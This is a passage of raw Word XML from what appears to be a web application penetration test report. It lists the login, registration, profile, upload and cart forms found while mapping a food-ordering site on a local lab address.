        <w:t xml:space="preserve"> When preforming the application mapping stage there where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> many forms and input fields</w:t>
      </w:r>
      <w:r w:rsidR="00C42A28">
        <w:t xml:space="preserve"> discovered</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00C42A28">
        <w:t>These included login and ordering functions as seen below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3093C89D" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="708" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2448"/>
        <w:gridCol w:w="2339"/>
        <w:gridCol w:w="3855"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E34950" w14:paraId="4FC35FAF" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8868" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="3083EA61" w14:textId="77777777" w:rsidR="00E34950" w:rsidRPr="00C42A28" w:rsidRDefault="00E34950" w:rsidP="00C42A28">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:bookmarkStart w:id="15" w:name="_Hlk57996457"/>
            <w:r w:rsidRPr="00C42A28">
              <w:lastRenderedPageBreak/>
              <w:t>http://192.168.1.20/index.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="15"/>
      <w:tr w:rsidR="00E34950" w14:paraId="0BC84D77" w14:textId="77777777" w:rsidTr="00E34950">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="153A8B40" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00E34950" w:rsidP="00C42A28">
            <w:r>
              <w:t>Form</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="01FCE574" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00E34950" w:rsidP="00C42A28">
            <w:r>
              <w:t>Input</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="5DFB4664" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00091FF6" w:rsidP="00C42A28">
            <w:r>
              <w:t>Fields</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E34950" w14:paraId="094099CB" w14:textId="77777777" w:rsidTr="00E34950">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1E507E43" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00E34950" w:rsidP="00C42A28">
            <w:r>
              <w:t>Login</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="11089461" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00371B99" w:rsidP="00C42A28">
            <w:r>
              <w:t>Allowing access to restricted areas of the site</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1130FE05" w14:textId="77777777" w:rsidR="004330DA" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t>Input: Email</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F8DC2CF" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t xml:space="preserve">            Password</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C77537F" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t>Tick: Remember me</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28CAEFE0" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t>Button: Clear Fields</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C613BD2" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t xml:space="preserve">               Login</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E34950" w14:paraId="453FAFDC" w14:textId="77777777" w:rsidTr="00E34950">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="0E58C48F" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00E34950" w:rsidP="00C42A28">
            <w:r>
              <w:t>Register</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="7E79642F" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="004330DA" w:rsidP="00C42A28">
            <w:r>
              <w:t>Creates a new user accounts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="12054ECC" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t>Input: First Name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70AC94FD" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t xml:space="preserve">            Last Name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27DCA68C" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t xml:space="preserve">            Email</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56EE0D6B" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t xml:space="preserve">            Password</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0585A36E" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t xml:space="preserve">            Confirm Password</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72DB7977" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t xml:space="preserve">            Security Answer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68CFC782" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t>Select: Security Question</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0625BB0B" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t>Button: Clear Fields</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70854F4A" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00C42A28">
            <w:r>
              <w:t xml:space="preserve">               Register</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="374A6D01" w14:textId="77777777" w:rsidR="00C42A28" w:rsidRDefault="00C42A28" w:rsidP="003C4D81">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="708" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2497"/>
        <w:gridCol w:w="2373"/>
        <w:gridCol w:w="3772"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E34950" w14:paraId="0A6020F5" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8868" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="3D449049" w14:textId="77777777" w:rsidR="00E34950" w:rsidRPr="00E34950" w:rsidRDefault="00E34950" w:rsidP="00371B99">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="00E34950">
              <w:t>http://192.168.1.20/foodzone.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E34950" w14:paraId="242EE048" w14:textId="77777777" w:rsidTr="00E34950">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2558" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="24DD01B7" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00E34950" w:rsidP="00371B99">
            <w:r>
              <w:t>Form</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2427" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="4D97917C" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00E34950" w:rsidP="00371B99">
            <w:r>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3883" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="4AB5313D" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00091FF6" w:rsidP="00371B99">
            <w:r>
              <w:t>Fields</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E34950" w14:paraId="3B5A071D" w14:textId="77777777" w:rsidTr="00E34950">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2558" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="355EEBF2" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00E34950" w:rsidP="00371B99">
            <w:r>
              <w:t>Choose your Food</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2427" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="158E68D3" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="005830D0" w:rsidP="00371B99">
            <w:r>
              <w:t>Allows for adding food items to the basket</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3883" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="13582C30" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="002B298F" w:rsidP="00371B99">
            <w:r>
              <w:t>Link</w:t>
            </w:r>
            <w:r w:rsidR="000560F4">
              <w:t>: Add To Cart</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38A3F67E" w14:textId="77777777" w:rsidR="005830D0" w:rsidRDefault="000560F4" w:rsidP="00371B99">
            <w:r>
              <w:t>Select: Category</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05341D70" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="00371B99">
            <w:r>
              <w:t>Button: Show Foods</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="07CFAA92" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00E34950" w:rsidP="003C4D81">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="708" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2469"/>
        <w:gridCol w:w="2335"/>
        <w:gridCol w:w="3838"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E34950" w14:paraId="62564AB1" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8868" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="44CF5E02" w14:textId="77777777" w:rsidR="00E34950" w:rsidRPr="00C42A28" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:bookmarkStart w:id="16" w:name="_Hlk57996480"/>
            <w:r w:rsidRPr="00371B99">
              <w:t>http://192.168.1.20/member-profile.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="16"/>
      <w:tr w:rsidR="00E34950" w14:paraId="6E821FED" w14:textId="77777777" w:rsidTr="00E34950">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="237C4B95" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00E34950" w:rsidP="00371B99">
            <w:r>
              <w:t>Form</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="726C6074" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00E34950" w:rsidP="00371B99">
            <w:r>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="42BD2D5D" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00091FF6" w:rsidP="00371B99">
            <w:r>
              <w:t>Fields</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E34950" w14:paraId="05E4991E" w14:textId="77777777" w:rsidTr="00E34950">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="110FAA75" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:r>
              <w:t>Change Your Password</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="210AF896" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="005830D0" w:rsidP="00371B99">
            <w:r>
              <w:t>Allows user to update the password on the database</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3CEF612B" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="000560F4">
            <w:r>
              <w:t>Input: Old Password</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="466F7DD2" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="000560F4">
            <w:r>
              <w:t xml:space="preserve">            New Password</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E3ABAE7" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="000560F4">
            <w:r>
              <w:t xml:space="preserve">            Confirm New Password</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E21130C" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="000560F4" w:rsidP="000560F4">
            <w:r>
              <w:t>Button: Change</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E34950" w14:paraId="1392E893" w14:textId="77777777" w:rsidTr="00E34950">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2DD2BACA" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:r>
              <w:t>Add Delivery/Billing Address</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="08549547" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="005830D0" w:rsidP="00371B99">
            <w:r>
              <w:t xml:space="preserve">This has fields for adding </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2FEF799E" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="000560F4">
            <w:r>
              <w:t>Input: First Name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11197E6A" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="000560F4">
            <w:r>
              <w:t xml:space="preserve">            Street Address</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A135E16" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="000560F4">
            <w:r>
              <w:t xml:space="preserve">            P.O. Box No</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="740D2098" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="000560F4">
            <w:r>
              <w:t xml:space="preserve">            City</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36A866AC" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="000560F4">
            <w:r>
              <w:t xml:space="preserve">            Mobile No</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7577AD45" w14:textId="77777777" w:rsidR="000560F4" w:rsidRDefault="000560F4" w:rsidP="000560F4">
            <w:r>
              <w:t xml:space="preserve">            Landline No</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B3F39A3" w14:textId="77777777" w:rsidR="00E34950" w:rsidRDefault="000560F4" w:rsidP="000560F4">
            <w:r>
              <w:t>Button: Add</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00895CA6" w14:paraId="5C22FC30" w14:textId="77777777" w:rsidTr="00E34950">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="05F11863" w14:textId="77777777" w:rsidR="00895CA6" w:rsidRDefault="00895CA6" w:rsidP="00371B99">
            <w:r>
              <w:t>Profile picture</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="0D413E4C" w14:textId="77777777" w:rsidR="00895CA6" w:rsidRDefault="00895CA6" w:rsidP="00371B99">
            <w:r>
              <w:t>Allows the uploading of a profile picture</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1AFFA328" w14:textId="77777777" w:rsidR="00895CA6" w:rsidRDefault="00895CA6" w:rsidP="00371B99">
            <w:r>
              <w:t>Upload</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4531A24A" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22"/>
    <w:p w14:paraId="1C2BDD75" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="708" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2453"/>
        <w:gridCol w:w="2337"/>
        <w:gridCol w:w="3852"/>
      </w:tblGrid>
      <w:tr w:rsidR="00371B99" w14:paraId="56ABB5CB" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8868" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="59DB8C8C" w14:textId="77777777" w:rsidR="00371B99" w:rsidRPr="00C42A28" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="00371B99">
              <w:lastRenderedPageBreak/>
              <w:t>http://192.168.1.20/cart.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00371B99" w14:paraId="7130CAEC" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="146A0BE8" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:r>
              <w:t>Form</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="435790FB" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:r>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="1161D4E3" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00091FF6" w:rsidP="00371B99">
            <w:r>
              <w:t>Fields</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00371B99" w14:paraId="3B42509D" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="77E5C45B" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="003A7AAA" w:rsidP="00371B99">
            <w:r>
              <w:t>Changing quantity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="44AAC461" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00895CA6" w:rsidP="00371B99">
            <w:r>
              <w:t>Allows the user to change the number of food items selected</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="663C97AD" w14:textId="77777777" w:rsidR="00431728" w:rsidRDefault="00895CA6" w:rsidP="00371B99">
            <w:r>
              <w:t>Select: Item ID</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D93AAE7" w14:textId="77777777" w:rsidR="00895CA6" w:rsidRDefault="00895CA6" w:rsidP="00371B99">
            <w:r>
              <w:t xml:space="preserve">             Quantity</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65103EB3" w14:textId="77777777" w:rsidR="00895CA6" w:rsidRDefault="00895CA6" w:rsidP="00371B99">
            <w:r>
              <w:t>Change quantity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003A7AAA" w14:paraId="060AE52D" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="7A1B6CFA" w14:textId="77777777" w:rsidR="003A7AAA" w:rsidRDefault="003A7AAA" w:rsidP="00371B99">
            <w:r>
              <w:t>Placing Order</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="093099C7" w14:textId="77777777" w:rsidR="003A7AAA" w:rsidRDefault="003A7AAA" w:rsidP="00371B99">
            <w:r>
              <w:t>Allows for users to placing of orders</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
